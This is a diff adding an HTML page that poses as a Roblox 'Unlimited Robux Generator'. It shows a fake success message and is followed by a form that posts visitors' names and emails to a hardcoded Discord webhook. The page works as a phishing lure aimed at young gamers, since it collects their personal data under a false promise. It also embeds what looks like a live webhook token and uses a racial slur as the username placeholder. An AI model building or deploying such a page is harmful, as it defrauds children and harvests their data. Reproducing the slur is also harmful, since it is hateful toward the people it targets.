@@ -1,0 +1,120 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox - Unlimited Robux Generator</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #e3e3e3;
+    }
+    .navbar {
+      background-color: #232527;
+      color: white;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .navbar img {
+      height: 35px;
+    }
+    .main {
+      padding: 40px;
+      text-align: center;
+      background-color: white;
+      max-width: 600px;
+      margin: 40px auto;
+      box-shadow: 0px 0px 15px rgba(0,0,0,0.1);
+      border-radius: 10px;
+    }
+    .main h1 {
+      color: #444;
+    }
+    .input-group {
+      margin: 20px 0;
+    }
+    input[type="text"], select {
+      padding: 10px;
+      width: 80%;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 25px;
+      background-color: #00b06e;
+      color: white;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-top: 20px;
+    }
+    .robux-counter {
+      margin-top: 30px;
+      font-size: 24px;
+      color: green;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="navbar">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/Roblox_Logo_2022.svg" alt="Roblox">
+    <div>Unlimited Robux Generator</div>
+  </div>  <div class="main">
+    <h1>Generate Free Robux</h1>
+    <div class="input-group">
+      <label>Enter Your Roblox Username:</label><br>
+      <input type="text" placeholder="e.g., nigger">
+    </div>
+    <div class="input-group">
+      <label>Select Amount of Robux:</label><br>
+      <select>
+        <option value="1000">1,000 Robux</option>
+        <option value="5000">5,000 Robux</option>
+        <option value="10000">10,000 Robux</option>
+        <option value="999999">999,999 Robux</option>
+        <option value="69">69 Robux</option>
+      </select>
+    </div>
+    <button onclick="generate()">Generate Robux</button>
+    <div class="robux-counter" id="robuxDisplay"></div>
+  </div>  <script>
+    function generate() {
+      let robux = document.querySelector('select').value;
+      document.getElementById('robuxDisplay').innerText = `✔️ Successfully added ${robux} Robux to your account!`;
+    }
+  </script></body>
+</html>
+<form id="myForm">
+  <input type="text" name="username" placeholder="Your name" required>
+  <input type="email" name="email" placeholder="Your email" required>
+  <button type="submit">Submit</button>
+</form>
+
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1388778381989904434/TH3GMrkUv3iFLIv8tlDPi8dWibsMLLtXFNSdUN35AgYj5ezkEHqYC7_MT4ONRIOuVmH-"; // replace this with your actual webhook
+
+  document.getElementById("myForm").addEventListener("submit", async function(e) {
+    e.preventDefault(); // prevent default form submission
+
+    const formData = new FormData(this);
+    const data = {};
+    formData.forEach((value, key) => (data[key] = value));
+
+    // For Discord webhook, use a different format
+    // This is for a generic JSON webhook:
+    await fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    });
+
+    alert("Form submitted!");
+  });
+</script>
